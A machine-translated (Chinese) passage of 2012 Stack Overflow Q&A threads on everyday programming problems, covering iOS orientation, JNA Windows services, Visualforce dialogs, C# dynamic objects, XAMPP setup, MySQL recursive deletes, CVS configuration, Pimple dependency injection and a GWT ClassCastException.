    //return UIInterfaceOrientationLandscapeLeft;
    return (toInterfaceOrientation == UIInterfaceOrientationPortraitUpsideDown); 
} 
```

上面的代码，但它在我的项目中不起作用。那么屏幕方向的正确程序是什么。提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-22T09:09:20.990

试试这个

```
[[UIApplication sharedApplication] setStatusBarOrientation:UIInterfaceOrientationLandscapeLeft animated:YES]; 
```

您无法设置`UIDeviceOrientation`，因为它是物理参数。如果您将设备保持在纵向 - 您如何以编程方式将其设置为横向？）。`UIDeviceOrientation`确实意味着-设备方向，而不是接口。这个答案描述了方向之间的差异： [https ://stackoverflow.com/a/3897243/194544](https://stackoverflow.com/a/3897243/194544)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-22T09:12:58.570

您必须放入`-(BOOL)shouldAutorotateToInterfaceOrientation:`每个 viewController 并检查正确的方向。如果您推送仅支持例如的 viewController。upsideDown，它将被颠倒呈现。

笔记：

*   如果您处于标签栏环境中，则行为会有所不同。请问，如果是这样的话。
*   如果您在谈论 rootViewController 您的应用程序应该设置对应于第一个 viewController (Info.plist)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-22T09:13:46.947

UIDevice 上的方向属性是**只读的**。

您可以`[UIViewController attemptRotationToDeviceOrientation];`尝试将所有视图控制器旋转到*设备当前方向。*您不能强制设置旋转。

# java - 使用 Win32 服务时线程中的异常

> ID：10685280
> 
> 赞同：1
> 
> 时间：2012-05-21T12:28:37.443
> 
> 标签：java, jna, win32-process

我正在使用以下代码来调节远程机器中的服务：

```
import com.sun.jna.platform.win32.W32Service;
 import com.sun.jna.platform.win32.W32ServiceManager;
 import com.sun.jna.platform.win32.Winsvc;

 public class CopyOfserviceRestart {
 public static void main(String[] args) {

//public void services()
{

W32ServiceManager serviceManager = new W32ServiceManager("TPATADTS5", null);   
serviceManager.open(Winsvc.SC_MANAGER_ALL_ACCESS);  
W32Service service = serviceManager.openService("Exponent Manager Service",   Winsvc.SC_MANAGER_ALL_ACCESS);  
 if( service.queryStatus().dwCurrentState == Winsvc.SERVICE_RUNNING)
 {
   System.out.println("Chalche");
}
else
{
   service.startService(); 
   service.close();
   System.out.println("Done");
 }  

 }
  }} 
```

对于少数服务器来说一切都很好但是对于其他少数服务器我得到以下错误：

线程“main”com.sun.jna.platform.win32.Win32Exception 中的异常：访问被拒绝。在 com.sun.jna.platform.win32.W32ServiceManager.open(W32ServiceManager.java:47) 在 com.accenture.service.CopyOfserviceRestart.main(CopyOfserviceRestart.java:15)

# python - TypeError：强制转换为 Unicode：需要字符串或缓冲区，找到字典

> ID：10685281
> 
> 赞同：-13
> 
> 时间：2012-05-21T12:28:37.703
> 
> 标签：python, matplotlib

有谁知道如何解决这个错误？

```
Exception Type: TypeError
Exception Value: coercing to Unicode: need string or buffer, dict found 
```

你能帮助我吗？？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-21T12:36:57.877

您正在提供预期字符串或缓冲区的字典。

您应该检查您的代码或围绕您获得异常的行进行调试，检查是否所有需要字符串的函数都没有获得字典。

您可能忘记为字典编制索引。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-15T13:35:40.663

正如其他人指出的那样，这个错误非常普遍。但是，在这种情况下，它似乎是由 matplotlibs 字体管理器中的问题引起的。我在尝试将 Latex 与 matplotlib 一起使用时遇到了类似的问题，并且能够按照 David 的建议通过从 matplotlib.get_configdir() 目录中删除 fontList.cache 来修复它。

# salesforce - 如何使用 Visualforce 添加自定义确认对话框

> ID：10685283
> 
> 赞同：0
> 
> 时间：2012-05-21T12:28:47.907
> 
> 标签：salesforce, apex-code, visualforce

正如我的 Apex 代码如下所示，

当用户使用“apex：commandButton”执行“saveSearchItems”操作时，如果验证结果为“假”，我想向用户显示确认对话框，并显示“验证失败，你想继续吗？”。

当用户按下“确定”按钮时，我想保存项目（通过执行 saveSearchItems 方法），如果用户按下“否​​”，我想停止保存（什么也不做）。

谁能告诉我如何使用 Apex 和 Visualforce 实现这一目标。非常感谢。

```
 /**
  * Save list of SearchItems 
  */
 public void saveSearchItems()  { 

    // Validate values of SearchItems 
       Boolean validateResult = validateSearchItems(this.searchItemList);

    // Save SearchItems   
       saveSearchItems(this.searchItemList);         
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-22T06:37:58.567

Apex 代码在服务器而不是客户端执行，因此 Apex 无法显示对话框。出于这个原因，您要么必须将验证移至客户端（使用 javascript onclick 处理程序），要么必须将保存过程拆分为两个对服务器的 Ajax 调用，一个用于验证另一个以保存，然后使用中间验证结果可选择显示对话框。选择取决于验证的复杂性 ( `validateSearchItems`)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-06-12T15:55:46.587

虽然 mmix 是正确的，但实际上有一种方法可以模拟这一点，它只需要一点创造性地使用 apex:actionFunction 和一些 javascript。您基本上将操作分解为两个调用来处理 http 的客户端/服务器模型的现实。

首先是验证调用，以确定是否应向用户显示弹出窗口，其次是根据用户响应在需要时调用保存。请记住，我的解决方案取决于 javascript 确认框，所以这里没有花哨的 ui :)

*仅供参考 - 我在我的示例中确实引用了 jquery，只需将 jquery 最小化库保存为 jquery.txt 并使用名称“jquery”添加到您的静态资源中，您就可以开始使用了。*

使用以下代码创建一个控制器类：

```
public class ActionFunctionCLS {

public Boolean causeValidationWarning {get; set;} // Just used for controlling the test behavoir from the ui. Not a part of the solution.
public String validationWarning {get; set;}

// Validates the record (or whatever) is good. If it is then we call save, else we set a warning message that 
// tells the ui to display a javascript popup box to the user confirming they really want to proceed.
public PageReference ValidateAndSaveRecord() {
    PageReference result = null;

    if(causeValidationWarning){
      validationWarning = 'This is a validation warning, hit Ok if you\'re sure you want to proceed.';
    }
    else {
      validationWarning = '';
      result = SaveRecord();
    }
    return result;
}

// Clears the validation warning so the ui won't try and display a confirmation box to the user
public void clearvalidationWarning(){
   validationWarning = '';
}

// Actually saves the record and then performs some post save function. Could be anything from displaying a save message (which means
// we'd need to clear the validation warning to keep the confimation pop from appearing), or it could even be a redirect somewhere else.
public PageReference SaveRecord() {
    ApexPages.Message myMsg = new ApexPages.Message(ApexPages.Severity.CONFIRM, 'Save Complete!', 'And I totally could have redirected you or something.');
    ApexPages.addMessage(myMsg);
  clearvalidationWarning();
    return null;
}

// Just to prove that our Validation & Save logic won't affect other functionality
public PageReference DoSomething() {
  ApexPages.Message myMsg = new ApexPages.Message(ApexPages.Severity.INFO, 'I did some other work.');
  ApexPages.addMessage(myMsg);
  return null;
} 
```

}

然后创建一个视觉力页面：

```
<apex:page controller="ActionFunctionCLS" id="pg" showHeader="true" sidebar="true">
<apex:includeScript value="{!$Resource.jquery}"/>

<script>
    var j$ = jQuery.noConflict(); //Needed for jQuery usage

    j$(document).ready(function(){           
        var validationWarningMsg = "{!validationWarning}";
        if(validationWarningMsg != ''){ // There was a validation warning, make sure the user still wants to save    
            if(confirm(validationWarningMsg)){
                saveRecordAction();
            }
            else {
                clearvalidationWarningAction();
            }
        }
    });
</script>

<apex:form id="myForm">
     <apex:pageMessages />
     <apex:actionfunction name="saveRecordAction" action="{!SaveRecord}" />
     <apex:actionfunction name="clearvalidationWarningAction" action="{!clearvalidationWarning}" />

     <apex:pageBlock tabStyle="Account">
        <apex:pageBlockButtons >
            <apex:commandButton value="Save Record" action="{!ValidateAndSaveRecord}" />
            <apex:commandButton value="Do Other Work" action="{!DoSomething}" />
       </apex:pageBlockButtons>

       <apex:pageBlockSection title="Stuff" columns="1" >
        <apex:inputCheckbox value="{!causeValidationWarning}" label="Cause a validation warning" />
       </apex:pageBlockSection>
    </apex:pageBlock>
</apex:form> 
```

并测试！apex:actionFunction 是我最喜欢的新功能之一，它允许您从 javascript 直接对控制器方法进行 ajax 调用，而无需编写丑陋的代码，非常简洁。

这里发生的事情是保存按钮调用了 ValidateAndSaveRecord()，它运行我们想象的验证，然后如果一切看起来都很好，则实际保存。如果不是，它会在控制器上设置一个字符串属性并返回。页面上的 javascript 在页面加载时查找此字符串，如果找到，则会显示确认弹出窗口。

当用户单击“确定”时，另一个 ajax 调用将被发送到 Save() 但跳过验证，因为这已经完成了。如果他们单击取消，仍会调用以清除警告字符串，因此下一次回发不会导致页面再次显示弹出窗口。*这一步非常重要！*

我认为我的解决方案可能会引起一些胃痛，因为它非常依赖于取消调用，但根据我的经验，它非常可靠。享受。

# c# - “System.Dynamic.ExpandoObject”不包含名为“Name”的属性

> ID：10685284
> 
> 赞同：0
> 
> 时间：2012-05-21T12:28:49.320
> 
> 标签：c#, dynamic, expandoobject

这是我所拥有的：

```
var listAddresses = GetAddresses().ToList();
return Json(new JsonResult { Data = new SelectList(listAddresses, "Name", "Id") }, JsonRequestBehavior.AllowGet); 
```

但我收到错误“System.Dynamic.ExpandoObject”不包含名为“Name”的属性。

listAddresses 由 10 个项目组成。当我调试时，当我观看它们中的每一个时，我会转到动态视图并且有名称和 ID。这个怎么恢复？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:35:55.600

```
var listAddresses = GetAddresses().ToList();
var data = new 
{ 
    Data = new SelectList(listAddresses, "Name", "Id") 
};
return Json(data, JsonRequestBehavior.AllowGet); 
```

`Json(...)`是一个`JsonResult`，你不需要两者。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T12:46:29.100

像这样尝试-->

```
var listAddresses = GetAddresses().ToList(); 
        List<ListItem> addressList = new List<ListItem>();
        foreach (IAddress address in listAddresses )
            {
                ListItem items = new ListItem();
                items.Text = address.Name;
                items.Value = address.ID;
                addressList .Add(items);

            }
        }
    return Json(new JsonResult { Data = new SelectList(addressList, "Value", "Text") }, JsonRequestBehavior.AllowGet); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:08:56.583

`dynamic`不使用关键字就不能使用 C# 的动态特性。所以：

```
var listAddreses = GetAddresses().ToList(); 
```

给你留下一个`List<ExpandoObject>`真正没有你提到的任何属性的东西。 *但是*，如果您说：

```
List<dynamic> listAddresses = GetAddresses().ToList(); 
```

它应该工作。

# jquery - 在选择开始时间之前禁用时间选择器中的结束时间

> ID：10685285
> 
> 赞同：1
> 
> 时间：2012-05-21T12:28:53.040
> 
> 标签：jquery, timepicker

我有一个用于存储开始时间的 jQuery timepicker 组件，例如

```
$("#startTimePicker").timepicker({

        showOn : "both",
        buttonImage : "UX_Common/images/icon_timepicker.png",
        buttonImageOnly : true,
        ampm : true,
        stepMinute : 5,

    }); 
```

另一个用于存储结束时间，例如

```
$("#endTimePicker").timepicker({

        showOn : "both",
        buttonImage : "UX_Common/images/icon_timepicker.png",
        buttonImageOnly : true,
        ampm : true,
        stepMinute : 5,

    }); 
```

我需要验证，比如结束时间不应该早于开始时间。我需要为此做些什么？请帮忙。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:43:28.017

您是否尝试过此[页面](http://trentrichardson.com/examples/timepicker/)和[jQuery 文档](http://haineault.com/media/jquery/ui-timepickr/page/)上的示例？

# c# - HtmlAgility Pack 并行化 VS Winforms HtmlDocument 速度

> ID：10685291
> 
> 赞同：0
> 
> 时间：2012-05-21T12:29:15.120
> 
> 标签：c#, webbrowser-control, html-agility-pack, dom

我有一个程序，我正试图尽快开始工作。该程序加载许多不同的网站并对其进行一些抓取。

我曾经使用 Forms.HtmlDocument 执行抓取（我基本上是使用 WebRequests 下载它，然后使用 WebBrowser 控件将其推送到文档中） - 但是由于无法强制 WebBrowser当它不是主线程时更新。

所以我决定尝试 HtmlAgilityPack，想也许我可以把它并行化。但是后来我阅读了以下帖子：

[如何使用 Parallel.For/ForEach 获得最大性能？（包括表演时间）](https://stackoverflow.com/questions/7734295/how-to-get-max-performance-using-parallel-for-foreach-performance-timings-incl)

这表明它并不能很好地并行化。

转换所有代码需要一些时间（由于怪癖和这一切的复杂性） - 但是我想知道它是否值得。如果我避免使用 WebGet（而是使用 WebRequest 获取流并将其推送到 AgilityPack 中）——这会给我带来有用的性能提升吗？目前，每次迭代大约需要 19 秒，大部分时间都在等待页面下载。

将考虑任何其他想法。谢谢。

编辑：当我们在这里时，使用这两种方法是否会提高速度（即使在单线程环境中？）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:01:53.030

就我而言，htmlagilitypack 运行良好。一个大问题是 RFC 合规性，当您创建运行速度尽可能快的应用程序时应该覆盖它。

1）在你的主要方法的开头添加这个

```
System.Net.ServicePointManager.DefaultConnectionLimit = 100; 
```

2）与普通的多线程库而不是 tpl 并行化。

# javascript - Javascript nextSibling 保留当前和下一个对象。可能吗？

> ID：10685292
> 
> 赞同：0
> 
> 时间：2012-05-21T12:29:19.497
> 
> 标签：javascript, nextsibling

我正在处理一张桌子，我需要处理当前行和下一行。我的功能如下所示：

```
function test(row) {
    alert(row.id); //it gives me the current row id, it works.
    nextrow = row.nextSibling.nextSibling; //not sure why, but i have to use it twice to get the right one.
    alert(nextrow.id); //this gives me the next row's id, also works.
    alert(row.id); //this also gives me the next row's id...it should give me the current one.
} 
```

任何想法，如果我可以将实际对象存储在某个地方，这样它就不会改变？谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:50:50.633

HTML nextSibling 属性返回下一个兄弟节点***，包括文本、换行符和注释***。

这可能就是为什么你必须调用它两次。

关于更改的事实`row.id`，我建议重新检查代码。如果没有row或row.id的影响，那么row.id就不会在代码的第1行和第4行之间发生变化。那是您的真实代码，还是为提高可读性而安排的代码？

对于 DOM 操作，如果可以，我强烈建议使用 jQuery。这是一个非常简单而强大的库，它使 DOM 操作变得非常容易。

如果你不能在你的上下文中使用它，你应该编写一个名为的实用方法`nextRow`，它将一个 TR 作为参数并返回下一个 TR。它将使用 nextSibling 属性，直到找到标记名实际上是 TR 的节点。

# php - Xampp 1.7.7 版 php 代码不起作用

> ID：10685294
> 
> 赞同：0
> 
> 时间：2012-05-21T12:29:24.607
> 
> 标签：php, apache, xampp

我已经为 Windows 安装了 Xampp 版本 1.7.7，我想开始学习 php。这里的问题是我无法运行 php 代码。

我试过这个非常简单的例子

```
<html>
<head>
<title>Hello world!</title>
</head>
<body>
    <?php echo "Hello world!"; ?>
</body>
</html> 
```

Ofcorse 我不双击 php 文件，也不只是在 Firefox 中执行它。我去

```
 http://localhost/xampp/htdocs/helloworld.php 
```

这是正确的方向，我检查了几次。我也尝试过 index.php，但它也不起作用。我得到这个错误。

```
Object not found!

The requested URL was not found on this server. If you entered the URL manually
please check your spelling and try again.

If you think this is a server error, please contact the webmaster.

Error 404

localhost
05/21/12 15:17:22
Apache/2.2.21 (Win32) mod_ssl/2.2.21 OpenSSL/1.0.0e PHP/5.3.8 mod_perl/2.0.4   
Perl/v5.10.1 
```

我已经使用默认选项安装了 Xampp，当我点击管理员（xampp xontrol 面板）时，我得到了经典的橙色页面。当我进入状态菜单时，它显示除了 SMTP 服务和 Tomcat 服务之外的所有内容都已激活。我试图卸载并重新安装 xampp，但没有任何改变。

我也在网上搜索过，但似乎没有任何帮助。谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-21T12:31:37.873

尝试

```
http://localhost/helloworld.php 
```

如果您将文件保存在 xampp/htdocs/

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-21T12:33:06.490

试试 http:// localhost/helloworld.php C:...\xampp\htdocs\ 是你的文档根目录，所以服务器从这个文件夹中获取文件，Firefox 可以通过 http://localhost/file 访问它们.php

# mysql - MySQL删除相关行的过程

> ID：10685299
> 
> 赞同：1
> 
> 时间：2012-05-21T12:29:52.203
> 
> 标签：mysql, procedure, delete-row

我有桌子：

```
id  parent  name 
```

现在，父字段是其他行的 id。正如MySQL所说，我不能为此使用触发器：

> 无法更新存储函数/触发器中的表“products_categories”，因为它已被调用此存储函数/触发器的语句使用。

一个过程应该如何删除所有具有父项的行，例如已删除的 id？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:45:25.157

您可以递归调用该过程。该过程必须执行以下操作：

*   将值读`parent`入变量
*   删除记录（通过它`id`）
*   如果`parent`value 不是 NULL - 再次调用该过程并将`parent`value 作为 IN 参数传递。

检查服务器变量**max_sp_recursion_depth** - 存储过程可以调用自身的次数。

# css - 元素的 css 属性与定义的不同

> ID：10685301
> 
> 赞同：0
> 
> 时间：2012-05-21T12:30:07.413
> 
> 标签：css, drupal, drupal-7

我一直在尝试在我正在开发的 drupal 网站中加入搜索栏（http://loopj.com/）。虽然我通过以下方式将元素的宽度定义为 400px：

```
ul.token-input-list {
overflow: hidden; 
height: auto !important; 
height: 1%;
width: 400px;
border: 1px solid #8496ba;
cursor: text;
font-size: 12px;
font-family: Verdana;
min-height: 1px;
z-index: 999;
margin: 0;
padding: 0;
background-color: #fff;
list-style-type: none;
clear: left; 
```

}

这导致我的指针有一个我无法删除的偏移量。所以我想能够停用继承的属性就可以了，知道怎么做吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:58:33.973

尝试在您的 CSS 属性前添加 !important ，

```
Ex:-
padding: 0!important ; 
```

ETC...

# dos - DOS 批处理 - 我需要大量的调试输出

> ID：10685303
> 
> 赞同：0
> 
> 时间：2012-05-21T12:30:16.087
> 
> 标签：dos, batch-file

我在这里遇到了一个烦人的问题。我的构建系统在构建过程中使用了一些 DOS 批处理片段，它们在某些情况下非常复杂。

我有一个错误，任务只是中止而完全没有错误-.-

我记得在互联网上读到过可以以某种方式扩展输出。我认为这是启用扩展的东西。

有人知道我到底在找什么吗？由于我找不到唯一的关键字进行搜索，因此网络上的一项研究进展顺利。

干杯一月

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T08:17:15.677

这可能不是完全有帮助，但如果您的脚本中有“echo off”（多个实例），请将其重置为“echo on”。将标准输出重定向到文件以便轻松搜索。

此外，如果在中间步骤中有任何“exit”语句，请将它们更改为“exit /b”（并将“exit”更改为“exit /b”），以便仅退出该批处理文件（但不退出 cmd.exe 实例）。

谢谢！

帕拉格多克

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T08:40:47.577

这次我通过将脚本复制到批处理文件中解决了我的问题，删除了除第一个条件之外的所有内容，然后每次运行成功后开始添加逻辑内容。在那之后，我是否为逻辑元素提供了它们应该执行的操作。

这确实找到了错误的诀窍，但这花了我很多时间，因为脚本部分有 100 行，并且如前所述非常复杂。

# cvs - TortoiseCVS 退出并显示消息 > cvs [log aborted]: the :extssh: access method is not available on this system

> ID：10685305
> 
> 赞同：8
> 
> 时间：2012-05-21T12:30:17.303
> 
> 标签：cvs, tortoisecvs

当我尝试通过 CVS 提交到存储库时，我收到错误消息

```
cvs [log aborted]: the :extssh: access method is not available on this system 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-21T12:33:17.993

根据我找到的信息

[http://blog.gmane.org/gmane.comp.version-control.cvs.tortoisecvs.user/month=20080701/page=2](http://blog.gmane.org/gmane.comp.version-control.cvs.tortoisecvs.user/month=20080701/page=2)

[http://customer.march-hare.com/webtools/bugzilla/ttshow_bug.cgi?tt=1&id=4918](http://customer.march-hare.com/webtools/bugzilla/ttshow_bug.cgi?tt=1&id=4918)

和

[http://www.cvsnt.org/pipermail/cvsnt/2007-March/028600.html](http://www.cvsnt.org/pipermail/cvsnt/2007-March/028600.html)

换行就可以解决这个问题

extssh = ssh_protocol.dll

至

extssh = ssh.dll

在文件**C:\Program Files (x86)\CVSNT\protocol_map.ini** *(Windows 7)*

并将文件移动到

**C:\Program Files (x86)\CVSNT\protocols\protocol_map.ini** *(Windows 7)*

希望这可以帮助某人

# php - 了解痘痘

> ID：10685307
> 
> 赞同：17
> 
> 时间：2012-05-21T12:30:22.233
> 
> 标签：php, dependency-injection

我不明白这个“DI 容器”是如何使用的。官方网站上显示的示例什么也没告诉我：http: [//pimple.sensiolabs.org](http://pimple.sensiolabs.org)

基本上我有一个简单的站点，它由一组类组成：DB 类、Cache 类、User 类和其他一些处理内容类型的类。

所有这些类就像 Pimple 中提到的“服务”，每个服务都应该能够调用另一个服务。现在我在一个主类中实例化服务，我像单例一样使用它来在其他类之间共享服务。

从我读到的内容来看，Pimple 正是这样做的，但我该如何使用它呢？：秒

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-05-21T12:38:50.490

[在http://phpmaster.com/dependency-injection-with-pimple/](http://phpmaster.com/dependency-injection-with-pimple/)有一个教程，解释了如何将 Pimple 用作 DIC。

另一种（但不一定推荐）方法是将容器注入到所有需要它的组件中（例如，您像 ServiceLocator 一样使用它），然后您只需按照文档中的说明从 Pimple 获取对象：

```
class SomeClassThatNeedsSession
{
    private $session;
    public function __construct(Pimple $container) 
    {
        $this->session = $container['session'];
    }
} 
```

换句话说，您只需获取您需要的内容，[Pimple 将处理该对象的生命周期，例如它是否需要被创建或被重用](https://github.com/fabpot/Pimple/blob/master/lib/Pimple.php#L75)。OffsetGet 是`ArrayAccess`接口的一部分，它允许您访问像数组一样的对象，因此当您这样做时，`$container['foo']`Pimple 将检查它是否为 foo 定义了一个闭包，以确定它是否只是一些参数并相应地组装服务。

Pimple 是[一篇关于 Lambdas 和 Closures 的博客文章](http://fabien.potencier.org/article/17/on-php-5-3-lambda-functions-and-closures)的结果，您可能想阅读它以更好地了解它是如何工作的。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-21T12:35:33.720

我不知道 Pimple，但我知道的 DI 引擎可以让你摆脱实例化。您的对象不会创建其依赖项的实例。相反，DI 引擎会根据要求创建它们并分发它们。

因此，如果您的 PHP 代码正在创建新实例，我认为您应该更改它，以便您的代码获取 DI 引擎并从中获取依赖关系。

# java - RequestFactory GWT/GAE 中的 ClassCastException

> ID：10685312
> 
> 赞同：-1
> 
> 时间：2012-05-21T12:30:45.060
> 
> 标签：java, google-app-engine, gwt, requestfactory

我有三个代理接口：

```
IModuleBaseProxy
IBerichtModuleProxy extends IModuleBaseProxy
INewsModuleProxy extends IModuleBaseProxy 
```

函数 clientfactory.getModule(id) 返回一个 IModuleBaseProxy

```
public IModuleBaseProxy getModule(String id) {
    return moduleList.get(id);
} 
```

我有以下问题，而 1\. 有效，2\. 无效：

1.

```
INewsModuleProxy nm = (INewsModuleProxy) clientfactory.getModule(id); 
```

2.

```
IBerichtModuleProxy bm =(IBerichtModuleProxy) clientfactory.getModule(id); 
```

我得到以下异常：

```
Caused by: java.lang.ClassCastException: ch.zhaw.ams.client.core.module.IModuleBaseProxyAutoBean_com_google_web_bindery_requestfactory_shared_impl_EntityProxyCategory_com_google_web_bindery_requestfactory_shared_impl_ValueProxyCategory_com_google_web_bindery_requestfactory_shared_impl_BaseProxyCategory$1 cannot be cast to ch.zhaw.ams.module.football.sfv.bericht.client.IBerichtModuleProxy 
```

完整的堆栈跟踪：

```
14:21:50.922 [ERROR] [simpleams] Uncaught exception escaped

com.google.web.bindery.event.shared.UmbrellaException: One or more exceptions caught, see full set in UmbrellaException#getCauses
    at com.google.web.bindery.requestfactory.shared.impl.AbstractRequestContext$StandardPayloadDialect.processPayload(AbstractRequestContext.java:387)
    at com.google.web.bindery.requestfactory.shared.impl.AbstractRequestContext$5.onTransportSuccess(AbstractRequestContext.java:1108)
    at ch.zhaw.ams.client.core.AmsRequestTransport$1.onTransportSuccess(AmsRequestTransport.java:30)
    at com.google.web.bindery.requestfactory.gwt.client.DefaultRequestTransport$1.onResponseReceived(DefaultRequestTransport.java:136)
    at com.google.gwt.http.client.Request.fireOnResponseReceived(Request.java:287)
    at com.google.gwt.http.client.RequestBuilder$1.onReadyStateChange(RequestBuilder.java:395)
    at sun.reflect.GeneratedMethodAccessor77.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at com.google.gwt.dev.shell.MethodAdaptor.invoke(MethodAdaptor.java:103)
    at com.google.gwt.dev.shell.MethodDispatch.invoke(MethodDispatch.java:71)
    at com.google.gwt.dev.shell.OophmSessionHandler.invoke(OophmSessionHandler.java:172)
    at com.google.gwt.dev.shell.BrowserChannelServer.reactToMessagesWhileWaitingForReturn(BrowserChannelServer.java:337)
    at com.google.gwt.dev.shell.BrowserChannelServer.invokeJavascript(BrowserChannelServer.java:218)
    at com.google.gwt.dev.shell.ModuleSpaceOOPHM.doInvoke(ModuleSpaceOOPHM.java:136)
    at com.google.gwt.dev.shell.ModuleSpace.invokeNative(ModuleSpace.java:561)
    at com.google.gwt.dev.shell.ModuleSpace.invokeNativeObject(ModuleSpace.java:269)
    at com.google.gwt.dev.shell.JavaScriptHost.invokeNativeObject(JavaScriptHost.java:91)
    at com.google.gwt.core.client.impl.Impl.apply(Impl.java)
    at com.google.gwt.core.client.impl.Impl.entry0(Impl.java:213)
    at sun.reflect.GeneratedMethodAccessor28.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at com.google.gwt.dev.shell.MethodAdaptor.invoke(MethodAdaptor.java:103)
    at com.google.gwt.dev.shell.MethodDispatch.invoke(MethodDispatch.java:71)
    at com.google.gwt.dev.shell.OophmSessionHandler.invoke(OophmSessionHandler.java:172)
    at com.google.gwt.dev.shell.BrowserChannelServer.reactToMessages(BrowserChannelServer.java:292)
    at com.google.gwt.dev.shell.BrowserChannelServer.processConnection(BrowserChannelServer.java:546)
    at com.google.gwt.dev.shell.BrowserChannelServer.run(BrowserChannelServer.java:363)
    at java.lang.Thread.run(Thread.java:662)
Caused by: java.lang.ClassCastException: ch.zhaw.ams.client.core.module.IModuleBaseProxyAutoBean_com_google_web_bindery_requestfactory_shared_impl_EntityProxyCategory_com_google_web_bindery_requestfactory_shared_impl_ValueProxyCategory_com_google_web_bindery_requestfactory_shared_impl_BaseProxyCategory$1 cannot be cast to ch.zhaw.ams.module.football.sfv.bericht.client.IBerichtModuleProxy
    at ch.zhaw.ams.module.football.sfv.bericht.client.presenter.ams.BerichtPresenter.&lt;init&gt;(BerichtPresenter.java:74)
    at ch.zhaw.ams.client.ams.IReflectiveAmsFactoryWrapper.newInstance(IReflectiveAmsFactoryWrapper.java:5)
    at ch.zhaw.ams.client.ams.presenter.AmsPresenter$1.onSuccess(AmsPresenter.java:124)
    at ch.zhaw.ams.client.ams.presenter.AmsPresenter$1.onSuccess(AmsPresenter.java:1)
    at com.google.web.bindery.requestfactory.shared.impl.AbstractRequest.onSuccess(AbstractRequest.java:129)
    at com.google.web.bindery.requestfactory.shared.impl.AbstractRequestContext$StandardPayloadDialect.processPayload(AbstractRequestContext.java:354)
    at com.google.web.bindery.requestfactory.shared.impl.AbstractRequestContext$5.onTransportSuccess(AbstractRequestContext.java:1108)
    at ch.zhaw.ams.client.core.AmsRequestTransport$1.onTransportSuccess(AmsRequestTransport.java:30)
    at com.google.web.bindery.requestfactory.gwt.client.DefaultRequestTransport$1.onResponseReceived(DefaultRequestTransport.java:136)
    at com.google.gwt.http.client.Request.fireOnResponseReceived(Request.java:287)
    at com.google.gwt.http.client.RequestBuilder$1.onReadyStateChange(RequestBuilder.java:395)
    at sun.reflect.GeneratedMethodAccessor77.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at com.google.gwt.dev.shell.MethodAdaptor.invoke(MethodAdaptor.java:103)
    at com.google.gwt.dev.shell.MethodDispatch.invoke(MethodDispatch.java:71)
    at com.google.gwt.dev.shell.OophmSessionHandler.invoke(OophmSessionHandler.java:172)
    at com.google.gwt.dev.shell.BrowserChannelServer.reactToMessagesWhileWaitingForReturn(BrowserChannelServer.java:337)
    at com.google.gwt.dev.shell.BrowserChannelServer.invokeJavascript(BrowserChannelServer.java:218)
    at com.google.gwt.dev.shell.ModuleSpaceOOPHM.doInvoke(ModuleSpaceOOPHM.java:136)
    at com.google.gwt.dev.shell.ModuleSpace.invokeNative(ModuleSpace.java:561)
    at com.google.gwt.dev.shell.ModuleSpace.invokeNativeObject(ModuleSpace.java:269)
    at com.google.gwt.dev.shell.JavaScriptHost.invokeNativeObject(JavaScriptHost.java:91)
    at com.google.gwt.core.client.impl.Impl.apply(Impl.java)
    at com.google.gwt.core.client.impl.Impl.entry0(Impl.java:213)
    at sun.reflect.GeneratedMethodAccessor28.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at com.google.gwt.dev.shell.MethodAdaptor.invoke(MethodAdaptor.java:103)
    at com.google.gwt.dev.shell.MethodDispatch.invoke(MethodDispatch.java:71)
    at com.google.gwt.dev.shell.OophmSessionHandler.invoke(OophmSessionHandler.java:172)
    at com.google.gwt.dev.shell.BrowserChannelServer.reactToMessages(BrowserChannelServer.java:292)
    at com.google.gwt.dev.shell.BrowserChannelServer.processConnection(BrowserChannelServer.java:546)
    at com.google.gwt.dev.shell.BrowserChannelServer.run(BrowserChannelServer.java:363)
    at java.lang.Thread.run(Thread.java:662) 
```

有人明白这一点吗？

最善良的山姆

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-26T08:40:59.837

好的，在没有看到您的代码的情况下，我会假设当您收到异常时，您返回了一个 INewsModuleProxy 并试图将其视为 IBerichtModuleProxy。为了向自己证明这一点，您可以在返回之前打印对象的类型。

我很想质疑您的设计，因为您的返回类型表明客户应该不关心具体的实现。如果这是真的，你为什么要低调？

R

# ios - 检测耳机是否已插入 iOS 设备

> ID：10685313
> 
> 赞同：2
> 
> 时间：2012-05-21T12:30:53.200
> 
